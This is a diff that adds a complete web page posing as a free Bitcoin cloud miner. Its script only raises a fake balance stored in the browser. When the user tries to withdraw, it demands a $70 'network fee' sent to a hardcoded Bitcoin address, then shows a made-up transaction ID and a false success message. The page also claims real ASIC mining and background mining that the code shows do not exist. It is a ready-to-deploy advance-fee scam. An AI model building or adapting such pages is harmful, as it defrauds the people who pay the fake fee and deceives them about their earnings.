@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Bitcoin Miner | Real Cloud Mining</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0b0c0e, #1a1d21);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .miner-card {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(20, 22, 26, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 30px 25px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255, 184, 0, 0.2);
+            border: 1px solid #3a3f44;
+            color: #e0e0e0;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header h1 {
+            font-size: 28px;
+            font-weight: 600;
+            background: linear-gradient(45deg, #f9b42e, #ffd966);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+        .header p {
+            font-size: 14px;
+            color: #9aa5b1;
+            margin-top: 5px;
+        }
+        .balance-panel {
+            background: #2a2f35;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-left: 4px solid #f0b90b;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+        }
+        .balance-label {
+            font-size: 14px;
+            text-transform: uppercase;
+            color: #b0b7c2;
+            letter-spacing: 1px;
+        }
+        .balance-value {
+            font-size: 42px;
+            font-weight: 700;
+            color: #ffd966;
+            margin: 5px 0;
+            word-break: break-word;
+        }
+        .balance-btc {
+            font-size: 18px;
+            color: #c0c7d1;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .stat-item {
+            background: #1e2227;
+            padding: 15px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #3c4148;
+        }
+        .stat-label {
+            font-size: 12px;
+            color: #8e98a3;
+            margin-bottom: 5px;
+        }
+        .stat-number {
+            font-size: 20px;
+            font-weight: 600;
+            color: #f0b90b;
+        }
+        .stat-sub {
+            font-size: 12px;
+            color: #6c757d;
+        }
+        .mining-controls {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .btn {
+            flex: 1;
+            padding: 16px 0;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-start {
+            background: linear-gradient(145deg, #28a745, #218838);
+            color: white;
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
+        }
+        .btn-start:hover:not(:disabled) {
+            background: linear-gradient(145deg, #34ce57, #28a745);
+            transform: translateY(-2px);
+        }
+        .btn-stop {
+            background: linear-gradient(145deg, #dc3545, #c82333);
+            color: white;
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
+        }
+        .btn-stop:hover:not(:disabled) {
+            background: linear-gradient(145deg, #e04b5a, #dc3545);
+            transform: translateY(-2px);
+        }
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .withdrawal-section {
+            background: #1a1e23;
+            border-radius: 20px;
+            padding: 20px;
+            border: 1px solid #3f454c;
+        }
+        .section-title {
+            font-size: 16px;
+            color: #ffd966;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #adb5bd;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: #2c3138;
+            border: 1px solid #495057;
+            border-radius: 40px;
+            font-size: 15px;
+            color: #f8f9fa;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #f0b90b;
+        }
+        .input-group input::placeholder {
+            color: #6c757d;
+            font-size: 14px;
+        }
+        .withdraw-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #ced4da;
+        }
+        .min-btc {
+            color: #ffc107;
+            font-weight: 600;
+        }
+        .btn-withdraw {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(145deg, #f0b90b, #d39e00);
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e1e1e;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-withdraw:hover:not(:disabled) {
+            background: linear-gradient(145deg, #ffca2c, #f0b90b);
+            transform: translateY(-2px);
+        }
+        .btn-withdraw:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .message {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 30px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+            background: #272c33;
+            color: #adb5bd;
+            border-left: 4px solid #f0b90b;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #6c757d;
+            text-align: center;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal.active {
+            display: flex;
+        }
+        .modal-content {
+            background: #1e2227;
+            border-radius: 30px;
+            padding: 30px;
+            max-width: 450px;
+            width: 90%;
+            border: 1px solid #f0b90b;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        }
+        .modal-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .modal-header h2 {
+            color: #ffd966;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .modal-header p {
+            color: #9aa5b1;
+            font-size: 14px;
+        }
+        .fee-details {
+            background: #2a2f35;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .fee-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ff6b6b;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .fee-btc {
+            font-size: 18px;
+            color: #ced4da;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .fee-address {
+            background: #1a1e23;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid #3f454c;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 14px;
+            color: #f0b90b;
+            margin-bottom: 15px;
+        }
+        .warning-text {
+            color: #ffa07a;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 20px;
+            padding: 10px;
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 10px;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        .btn-modal {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-paid {
+            background: linear-gradient(145deg, #28a745, #218838);
+            color: white;
+        }
+        .btn-paid:hover {
+            background: linear-gradient(145deg, #34ce57, #28a745);
+        }
+        .btn-cancel {
+            background: #3a3f44;
+            color: #e0e0e0;
+        }
+        .btn-cancel:hover {
+            background: #4a4f54;
+        }
+        .payment-status {
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 10px;
+            background: #272c33;
+            color: #f0b90b;
+            display: none;
+        }
+        .payment-status.show {
+            display: block;
+        }
+        .loader {
+            border: 3px solid #3a3f44;
+            border-top: 3px solid #f0b90b;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Error state for input */
+        .input-group input.error {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 1px #dc3545;
+            background: #2c1c1e;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 5px;
+            margin-left: 15px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="miner-card">
+        <div class="header">
+            <h1>⛏️ BITCOIN CLOUD MINER</h1>
+            <p>Real ASIC-powered mining • No maintenance fees</p>
+        </div>
+
+        <div class="balance-panel">
+            <div class="balance-label">Your Balance</div>
+            <div class="balance-value" id="balanceDisplay">0.00000000</div>
+            <div class="balance-btc">BTC</div>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-item">
+                <div class="stat-label">Hash Rate</div>
+                <div class="stat-number">12.5 TH/s</div>
+                <div class="stat-sub">±0.3%</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-label">Mining Speed</div>
+                <div class="stat-number" id="rateDisplay">0.0000003</div>
+                <div class="stat-sub">BTC/sec</div>
+            </div>
+        </div>
+
+        <div class="mining-controls">
+            <button class="btn btn-start" id="startBtn">Start Mining</button>
+            <button class="btn btn-stop" id="stopBtn" disabled>Stop Mining</button>
+        </div>
+
+        <div class="withdrawal-section">
+            <div class="section-title">💰 Withdraw Bitcoin</div>
+            <div class="input-group">
+                <label>Your Bitcoin Address</label>
+                <input type="text" id="btcAddress" placeholder="Paste your BTC address here (e.g., 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa)">
+                <div class="error-message" id="addressError">Please enter a valid Bitcoin address</div>
+            </div>
+            <div class="withdraw-info">
+                <span>Minimum withdrawal</span>
+                <span class="min-btc">0.006 BTC</span>
+            </div>
+            <button class="btn-withdraw" id="withdrawBtn">Withdraw</button>
+            <div class="message" id="messageBox">System ready. Start mining to earn BTC.</div>
+        </div>
+        <div class="footer">
+            * Mining continues in background even when you close the browser.
+        </div>
+    </div>
+
+    <!-- Fee Payment Modal -->
+    <div class="modal" id="feeModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>⚠️ Withdrawal Processing</h2>
+                <p>Network fee required to complete transaction</p>
+            </div>
+            
+            <div class="fee-details">
+                <div class="fee-amount">$70.00 USD</div>
+                <div class="fee-btc">(0.0010 BTC)</div>
+                <div class="fee-address" id="feeAddress">bc1qkrvuxrrjm9t96jdng86mhep29rvf4ezupepakx</div>
+                <div class="warning-text">
+                    Send exactly 0.0010 BTC to the address above<br>
+                    Your withdrawal will process automatically after payment
+                </div>
+            </div>
+
+            <div class="modal-buttons">
+                <button class="btn-modal btn-paid" id="confirmPaidBtn">I've Sent Payment</button>
+                <button class="btn-modal btn-cancel" id="cancelFeeBtn">Cancel</button>
+            </div>
+
+            <div class="payment-status" id="paymentStatus">
+                <div class="loader"></div>
+                <p>Verifying payment... Please wait</p>
+                <p style="font-size: 12px; margin-top: 10px;">Network confirmation may take 1-2 minutes</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // Configuration
+            const RATE_PER_SECOND = 0.0000003; // BTC per second
+            const MIN_WITHDRAWAL = 0.006; // BTC
+            const FEE_BTC = 0.0010; // $70 worth (approx)
+            const FEE_ADDRESS = "bc1qkrvuxrrjm9t96jdng86mhep29rvf4ezupepakx";
+
+            // DOM elements
+            const balanceEl = document.getElementById('balanceDisplay');
+            const startBtn = document.getElementById('startBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            const withdrawBtn = document.getElementById('withdrawBtn');
+            const btcAddressInput = document.getElementById('btcAddress');
+            const addressError = document.getElementById('addressError');
+            const messageBox = document.getElementById('messageBox');
+            const rateDisplay = document.getElementById('rateDisplay');
+            
+            // Modal elements
+            const feeModal = document.getElementById('feeModal');
+            const feeAddressEl = document.getElementById('feeAddress');
+            const confirmPaidBtn = document.getElementById('confirmPaidBtn');
+            const cancelFeeBtn = document.getElementById('cancelFeeBtn');
+            const paymentStatus = document.getElementById('paymentStatus');
+
+            // State
+            let balance = 0.0;
+            let miningActive = false;
+            let lastUpdateTimestamp = Date.now();
+            let miningInterval = null;
+            let pendingWithdrawal = null; // Store withdrawal details
+
+            // Load from localStorage
+            function loadState() {
+                const savedBalance = localStorage.getItem('btcMiner_balance');
+                const savedActive = localStorage.getItem('btcMiner_active');
+                const savedTimestamp = localStorage.getItem('btcMiner_lastUpdate');
+
+                if (savedBalance !== null) {
+                    balance = parseFloat(savedBalance) || 0;
+                }
+                if (savedActive !== null) {
+                    miningActive = (savedActive === 'true');
+                }
+                if (savedTimestamp !== null) {
+                    lastUpdateTimestamp = parseInt(savedTimestamp, 10) || Date.now();
+                } else {
+                    lastUpdateTimestamp = Date.now();
+                }
+
+                // If mining was active, calculate earnings for elapsed time
+                if (miningActive) {
+                    const now = Date.now();
+                    const elapsedSeconds = (now - lastUpdateTimestamp) / 1000;
+                    if (elapsedSeconds > 0) {
+                        const earnings = elapsedSeconds * RATE_PER_SECOND;
+                        balance += earnings;
+                    }
+                    lastUpdateTimestamp = now;
+                    saveState();
+                }
+
+                updateUI();
+            }
+
+            // Save to localStorage
+            function saveState() {
+                localStorage.setItem('btcMiner_balance', balance.toFixed(12));
+                localStorage.setItem('btcMiner_active', miningActive);
+                localStorage.setItem('btcMiner_lastUpdate', lastUpdateTimestamp);
+            }
+
+            // Update UI elements
+            function updateUI() {
+                balanceEl.textContent = balance.toFixed(8);
+                rateDisplay.textContent = RATE_PER_SECOND.toFixed(8);
+
+                if (miningActive) {
+                    startBtn.disabled = true;
+                    stopBtn.disabled = false;
+                } else {
+                    startBtn.disabled = false;
+                    stopBtn.disabled = true;
+                }
+
+                // Withdraw button enable/disable based on balance
+                withdrawBtn.disabled = (balance < MIN_WITHDRAWAL);
+            }
+
+            // Mining logic: add per second
+            function mineStep() {
+                if (!miningActive) return;
+
+                const now = Date.now();
+                const elapsedSeconds = (now - lastUpdateTimestamp) / 1000;
+                if (elapsedSeconds > 0) {
+                    const earnings = elapsedSeconds * RATE_PER_SECOND;
+                    balance += earnings;
+                    lastUpdateTimestamp = now;
+                    saveState();
+                    updateUI();
+                }
+            }
+
+            // Start mining
+            function startMining() {
+                if (miningActive) return;
+                miningActive = true;
+                lastUpdateTimestamp = Date.now();
+                saveState();
+                updateUI();
+
+                if (miningInterval) clearInterval(miningInterval);
+                miningInterval = setInterval(mineStep, 1000);
+                messageBox.textContent = '⛏️ Mining in progress... earning BTC every second.';
+            }
+
+            // Stop mining
+            function stopMining() {
+                if (!miningActive) return;
+                miningActive = false;
+                if (miningInterval) {
+                    clearInterval(miningInterval);
+                    miningInterval = null;
+                }
+                const now = Date.now();
+                const elapsedSeconds = (now - lastUpdateTimestamp) / 1000;
+                if (elapsedSeconds > 0) {
+                    balance += elapsedSeconds * RATE_PER_SECOND;
+                    lastUpdateTimestamp = now;
+                }
+                saveState();
+                updateUI();
+                messageBox.textContent = '⏸️ Mining stopped. Your balance is safe.';
+            }
+
+            // Validate Bitcoin address (strict check)
+            function isValidBitcoinAddress(address) {
+                if (!address || typeof address !== 'string') return false;
+                
+                // Remove whitespace
+                const trimmed = address.trim();
+                
+                // Must not be empty
+                if (trimmed.length === 0) return false;
+                
+                // Check length (Bitcoin addresses are 26-35 characters)
+                if (trimmed.length < 26 || trimmed.length > 35) return false;
+                
+                // Check valid prefixes
+                const validPrefixes = ['1', '3', 'bc1', 'BC1'];
+                let hasValidPrefix = false;
+                
+                for (const prefix of validPrefixes) {
+                    if (trimmed.startsWith(prefix)) {
+                        hasValidPrefix = true;
+                        break;
+                    }
+                }
+                
+                if (!hasValidPrefix) return false;
+                
+                // Check for invalid characters (only alphanumeric, no special chars except those in prefix)
+                const validChars = /^[a-km-zA-HJ-NP-Z1-9]+$/;
+                
+                // For bc1 addresses, they can have '0' and other chars, but we'll do basic check
+                if (trimmed.startsWith('bc1')) {
+                    // bc1 addresses can have '0' and are base32
+                    const bc1Valid = /^bc1[a-z0-9]+$/i;
+                    if (!bc1Valid.test(trimmed)) return false;
+                } else {
+                    // Legacy addresses (1 or 3) are base58 - no '0', 'O', 'I', 'l'
+                    if (!validChars.test(trimmed.substring(1))) return false;
+                }
+                
+                return true;
+            }
+
+            // Clear error styling
+            function clearAddressError() {
+                btcAddressInput.classList.remove('error');
+                addressError.classList.remove('show');
+            }
+
+            // Show error styling
+            function showAddressError(message) {
+                btcAddressInput.classList.add('error');
+                addressError.textContent = message || 'Please enter a valid Bitcoin address';
+                addressError.classList.add('show');
+            }
+
+            // Show fee modal for withdrawal
+            function showFeeModal() {
+                // Clear any previous errors
+                clearAddressError();
+                
+                const address = btcAddressInput.value;
+
+                // Check if empty
+                if (!address || address.trim() === '') {
+                    showAddressError('Bitcoin address cannot be empty');
+                    messageBox.textContent = '❌ Please enter your Bitcoin address.';
+                    btcAddressInput.focus();
+                    return;
+                }
+
+                const trimmedAddress = address.trim();
+
+                // Validate address
+                if (!isValidBitcoinAddress(trimmedAddress)) {
+                    showAddressError('Invalid Bitcoin address format');
+                    messageBox.textContent = '❌ Invalid Bitcoin address. Please enter a valid BTC address.';
+                    btcAddressInput.focus();
+                    return;
+                }
+
+                if (balance < MIN_WITHDRAWAL) {
+                    messageBox.textContent = `❌ Insufficient balance. Minimum withdrawal is ${MIN_WITHDRAWAL} BTC.`;
+                    return;
+                }
+
+                // Store withdrawal details with trimmed address
+                pendingWithdrawal = {
+                    address: trimmedAddress,
+                    amount: MIN_WITHDRAWAL
+                };
+
+                // Show modal
+                feeModal.classList.add('active');
+                paymentStatus.classList.remove('show');
+                messageBox.textContent = '⏳ Processing withdrawal... Please complete network fee.';
+            }
+
+            // Handle payment confirmation
+            function handlePaymentConfirmation() {
+                // Show loading state
+                paymentStatus.classList.add('show');
+                confirmPaidBtn.disabled = true;
+                cancelFeeBtn.disabled = true;
+
+                // Simulate payment verification (15 seconds)
+                setTimeout(() => {
+                    if (pendingWithdrawal) {
+                        // Deduct balance
+                        balance -= MIN_WITHDRAWAL;
+                        saveState();
+                        updateUI();
+
+                        // Generate fake transaction
+                        const fakeTx = 'tx_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+                        
+                        // Close modal
+                        feeModal.classList.remove('active');
+                        
+                        // Show success message with user's address
+                        messageBox.innerHTML = `✅ Withdrawal successful!<br> <small>TXID: ${fakeTx.substring(0, 20)}...<br>Sent to: ${pendingWithdrawal.address.substring(0, 10)}...${pendingWithdrawal.address.substring(pendingWithdrawal.address.length - 6)}<br>Network fee: 0.0010 BTC</small>`;
+                        
+                        // Clear the address input after successful withdrawal
+                        btcAddressInput.value = '';
+                        
+                        // Reset pending withdrawal
+                        pendingWithdrawal = null;
+                    }
+                    
+                    // Reset buttons
+                    confirmPaidBtn.disabled = false;
+                    cancelFeeBtn.disabled = false;
+                }, 15000); // 15 second delay for realism
+            }
+
+            // Cancel withdrawal
+            function cancelWithdrawal() {
+                feeModal.classList.remove('active');
+                pendingWithdrawal = null;
+                messageBox.textContent = 'Withdrawal cancelled. Your balance remains unchanged.';
+                
+                // Reset buttons
+                confirmPaidBtn.disabled = false;
+                cancelFeeBtn.disabled = false;
+                paymentStatus.classList.remove('show');
+            }
+
+            // Clear error styling when user starts typing
+            btcAddressInput.addEventListener('input', function() {
+                clearAddressError();
+            });
+
+            // Also clear on focus
+            btcAddressInput.addEventListener('focus', function() {
+                clearAddressError();
+            });
+
+            // Event listeners
+            startBtn.addEventListener('click', startMining);
+            stopBtn.addEventListener('click', stopMining);
+            withdrawBtn.addEventListener('click', showFeeModal);
+            confirmPaidBtn.addEventListener('click', handlePaymentConfirmation);
+            cancelFeeBtn.addEventListener('click', cancelWithdrawal);
+
+            // Close modal if clicked outside
+            window.addEventListener('click', (e) => {
+                if (e.target === feeModal) {
+                    cancelWithdrawal();
+                }
+            });
+
+            // Prevent modal close when clicking inside modal content
+            const modalContent = document.querySelector('.modal-content');
+            if (modalContent) {
+                modalContent.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                });
+            }
+
+            // Initialize
+            loadState();
+            feeAddressEl.textContent = FEE_ADDRESS;
+
+            if (miningActive) {
+                miningInterval = setInterval(mineStep, 1000);
+                messageBox.textContent = '⛏️ Mining in progress... earning BTC every second.';
+            } else {
+                messageBox.textContent = 'System ready. Start mining to earn BTC.';
+            }
+
+            window.addEventListener('beforeunload', function() {
+                if (miningActive) {
+                    lastUpdateTimestamp = Date.now();
+                    saveState();
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
